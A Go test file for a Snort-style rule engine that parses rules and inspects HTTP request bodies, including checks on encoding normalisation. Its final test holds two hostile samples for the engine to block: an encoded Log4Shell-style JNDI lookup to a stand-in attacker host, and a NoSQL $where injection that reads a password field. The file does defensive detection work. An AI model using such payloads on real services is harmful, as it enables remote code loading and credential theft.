package snort

import (
	"fmt"
	"net/http"
	"strings"
	"testing"
)

func TestRejectUnsupportedOrMalformedRules(t *testing.T) {
	tests := []string{
		`pass tcp any any -> any any (content:"evil"; sid:1;)`,
		`dropp tcp any any -> any any (content:"evil"; sid:1;)`,
		`drop udp any any -> any any (content:"evil"; sid:1;)`,
		`drop tcp $HOME_NET any -> any any (content:"evil"; sid:1;)`,
		`drop tcp any any <> any any (content:"evil"; sid:1;)`,
		`drop tcp any any -> any 443 (content:"evil"; sid:1;)`,
		`drop tcp any any -> any any extra (content:"evil"; sid:1;)`,
		`drop tcp any any -> any any (content:"evil"; sid:1;) trailing`,
		`drop tcp any any -> any any (content:"evil"; sid:1; flow:to_server;)`,
		`drop tcp any any -> any any (content:"evil"; sid:1; distance:3;)`,
		`drop tcp any any -> any any (http_uri; content:"evil"; sid:1;)`,
		`drop tcp any any -> any any (pcre:"/evil/"; nocase; sid:1;)`,
		`drop tcp any any -> any any (content:"evil"; http_uri; http_header; sid:1;)`,
		`drop tcp any any -> any any (content:"evil"; nocase:yes; sid:1;)`,
		`drop tcp any any -> any any (content:"evil"; offset:-1; sid:1;)`,
		`drop tcp any any -> any any (content:"evil"; depth:0; sid:1;)`,
		`drop tcp any any -> any any (content:"evil"; sid:0;)`,
		`drop tcp any any -> any any (content:"evil"; sid:1; rev:nope;)`,
		`drop tcp any any -> any any (content:"evil"; sid:1; sid:2;)`,
		`drop tcp any any -> any any (content:"evil";)`,
		`drop tcp any any -> any any (sid:1;)`,
		`drop tcp any any -> any any (content:""; sid:1;)`,
		`drop tcp any any -> any any (content:evil; sid:1;)`,
		`drop tcp any any -> any any (content:"a"b"; sid:1;)`,
		`drop tcp any any -> any any (content:"evil"; sid:1)`,
		`drop tcp any any -> any any (content:"|xx|"; sid:1;)`,
		`drop tcp any any -> any any (content:"|41"; sid:1;)`,
		`drop tcp any any -> any any (content:"\q"; sid:1;)`,
		`drop tcp any any -> any any (pcre:"//"; sid:1;)`,
		`drop tcp any any -> any any (pcre:"/evil/U"; sid:1;)`,
		`drop tcp any any -> any any (pcre:"/evil/ii"; sid:1;)`,
		`drop tcp any any -> any any (pcre:"/(?=evil)/"; sid:1;)`,
	}
	for _, raw := range tests {
		t.Run(raw, func(t *testing.T) {
			if _, err := ParseRule(raw); err == nil {
				t.Fatal("invalid rule accepted")
			}
		})
	}
}

func TestModifiersFollowMostRecentMatcher(t *testing.T) {
	r, err := ParseRule(`drop tcp any any -> any any (pcre:"/danger/"; http_uri; content:"payload"; http_client_body; nocase; sid:7;)`)
	if err != nil {
		t.Fatal(err)
	}
	if r.PCREs[0].Target != TargetHTTPURI || r.Contents[0].Target != TargetHTTPBody {
		t.Fatalf("incorrect targets: %+v", r)
	}
	engine := NewEngine()
	if err := engine.AddRule(r); err != nil {
		t.Fatal(err)
	}
	req, _ := http.NewRequest("POST", "https://example.test/danger", nil)
	if !engine.InspectHTTPRequest(req, []byte("PAYLOAD")).Blocked {
		t.Fatal("body and URI should match")
	}
	req, _ = http.NewRequest("POST", "https://example.test/payload", nil)
	if engine.InspectHTTPRequest(req, []byte("danger")).Blocked {
		t.Fatal("matched wrong fields")
	}
}

func TestAtomicDuplicateLoads(t *testing.T) {
	e := NewEngine()
	rule := `drop tcp any any -> any any (content:"evil"; sid:1;)`
	if _, err := e.LoadRulesFromReader(strings.NewReader(rule)); err != nil {
		t.Fatal(err)
	}
	for _, input := range []string{rule, rule + "\n" + rule, `drop tcp any any -> any any (content:"new"; sid:2;)` + "\n" + rule, `drop tcp any any -> any any (content:"new"; sid:2;)` + "\ninvalid"} {
		if _, err := e.LoadRulesFromReader(strings.NewReader(input)); err == nil {
			t.Fatal("expected error")
		}
		if e.RuleCount() != 1 {
			t.Fatal("partial rules registered")
		}
	}
}

func TestNormalizationAndNegation(t *testing.T) {
	cases := []struct{ name, body string }{
		{"plain", "evil"}, {"percent", "%65vil"}, {"malformedPercent", "%65vil&bad=%"}, {"double", "%2565vil"}, {"triple", "%252565vil"},
		{"html", "&#101;vil"}, {"JSON", `{"cmd":"\u0065vil"}`}, {"escapedSlash", `{"cmd":"evil\/path"}`},
		{"duplicateJSONKeys", `{"cmd":"evil","cmd":"safe"}`}, {"mixed", `{"cmd":"%65vil"}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			for _, negate := range []bool{false, true} {
				mark := ""
				if negate {
					mark = "!"
				}
				e := NewEngine()
				_, err := e.LoadRulesFromReader(strings.NewReader(fmt.Sprintf(`drop tcp any any -> any any (content:%s"evil"; http_client_body; sid:1;)`, mark)))
				if err != nil {
					t.Fatal(err)
				}
				req, _ := http.NewRequest("POST", "https://example.test/api", nil)
				got := e.InspectHTTPRequest(req, []byte(c.body))
				if got.Blocked == negate {
					t.Fatalf("negated=%v result=%+v", negate, got)
				}
			}
		})
	}
}

func TestRawViewsAndOffsetsPreserved(t *testing.T) {
	e := NewEngine()
	_, err := e.LoadRulesFromReader(strings.NewReader(`drop tcp any any -> any any (content:"%65vil"; http_client_body; offset:2; depth:6; sid:1;)`))
	if err != nil {
		t.Fatal(err)
	}
	req, _ := http.NewRequest("POST", "https://example.test/api", nil)
	if !e.InspectHTTPRequest(req, []byte("xx%65vil")).Blocked {
		t.Fatal("raw variant lost")
	}
	if e.InspectHTTPRequest(req, []byte("xxxx%65vil")).Blocked {
		t.Fatal("depth ignored")
	}
}

func TestRulePrecedence(t *testing.T) {
	e := NewEngine()
	_, err := e.LoadRulesFromReader(strings.NewReader(`alert tcp any any -> any any (content:"evil"; sid:1;)` + "\n" + `drop tcp any any -> any any (content:"evil"; sid:2;)`))
	if err != nil {
		t.Fatal(err)
	}
	req, _ := http.NewRequest("POST", "https://example.test/api", nil)
	result := e.InspectHTTPRequest(req, []byte("evil"))
	if !result.Blocked || result.MatchedRule.SID != 2 {
		t.Fatalf("alert bypassed blocking: %+v", result)
	}
}

func TestInspectionLimits(t *testing.T) {
	e := NewEngine()
	req, _ := http.NewRequest("POST", "https://example.test/api", nil)
	if e.InspectHTTPRequest(req, []byte(strings.Repeat("a", MaxBodyBytes))).Blocked {
		t.Fatal("exact limit rejected")
	}
	if !e.InspectHTTPRequest(req, []byte(strings.Repeat("a", MaxBodyBytes+1))).Blocked {
		t.Fatal("oversize accepted")
	}
	req.Header.Set("Content-Encoding", "gzip")
	if !e.InspectHTTPRequest(req, []byte("bytes")).Blocked {
		t.Fatal("compressed opaque payload accepted")
	}
	if !e.InspectHTTPRequest(nil, nil).Blocked || !e.Inspect(nil).Blocked {
		t.Fatal("nil input accepted")
	}
}

func TestNormalizationExpansionLimit(t *testing.T) {
	// Nested mixed encodings generate a branching set of views. Never silently
	// discard views once the budget is exhausted.
	_, err := normalizedViews("%41&#65;+", 1)
	if err == nil {
		t.Fatal("normalization budget not enforced")
	}
}

func TestBenignWorkflowCorpus(t *testing.T) {
	e, err := DefaultEngine()
	if err != nil {
		t.Fatal(err)
	}
	for _, body := range []string{
		`{"messages":[{"role":"user","content":"Summarize the project and propose tests."}]}`,
		`{"query":"query GetUser { user(id: 123) { name email } }"}`,
		`{"query":"SELECT name FROM products WHERE id = 10"}`,
		`{"command":"go test ./..."}`,
		`{"command":"npm ci && npm test"}`,
		`{"content":"Use SELECT to query records. See the security documentation."}`,
		`{"path":"src/main.go","content":"package main"}`,
		`{"text":"These instructions describe the API request format."}`,
	} {
		req, _ := http.NewRequest("POST", "https://api.example.test/v1/messages", nil)
		req.Header.Set("Authorization", "Bearer ghp_"+strings.Repeat("a", 36))
		req.Header.Set("X-Api-Key", "sk-proj-"+strings.Repeat("a", 100))
		if got := e.InspectHTTPRequest(req, []byte(body)); got.Blocked {
			t.Errorf("benign request blocked: %s (%s)", body, got.Reason)
		}
	}
}

func BenchmarkDefaultBenignRequest(b *testing.B) {
	e, err := DefaultEngine()
	if err != nil {
		b.Fatal(err)
	}
	req, _ := http.NewRequest("POST", "https://api.example.test/v1/messages", nil)
	body := []byte(`{"messages":[{"role":"user","content":"Summarize this project."}]}`)
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.InspectHTTPRequest(req, body)
	}
}

func TestAddRuleValidationAndDisabledState(t *testing.T) {
	e := NewEngine()
	for _, raw := range []string{"", "# comment", `alert tcp any any -> any any (content:"evil"; sid:1;)` + "\n" + `alert tcp any any -> any any (content:"evil"; sid:2;)`} {
		if err := e.AddRule(&Rule{Raw: raw, Enabled: true}); err == nil {
			t.Fatal("invalid serialized rule accepted")
		}
	}
	r, err := ParseRule(`drop tcp any any -> any any (content:"evil"; sid:1;)`)
	if err != nil {
		t.Fatal(err)
	}
	r.Enabled = false
	if err := e.AddRule(r); err != nil {
		t.Fatal(err)
	}
	req, _ := http.NewRequest("POST", "https://example.test/api", nil)
	if e.InspectHTTPRequest(req, []byte("evil")).Blocked {
		t.Fatal("disabled rule activated")
	}
}

func TestEscapedJSONPropertyAndMalformedPercent(t *testing.T) {
	e, err := DefaultEngine()
	if err != nil {
		t.Fatal(err)
	}
	for _, body := range []string{`{"\u0024where":"function(){return this.password}"}`, `%24%7Bjndi%3Aldap://attacker.invalid/x%7D&bad=%`} {
		req, _ := http.NewRequest("POST", "https://example.test/api", nil)
		if got := e.InspectHTTPRequest(req, []byte(body)); !got.Blocked {
			t.Fatalf("encoded attack passed: %s", body)
		}
	}
}
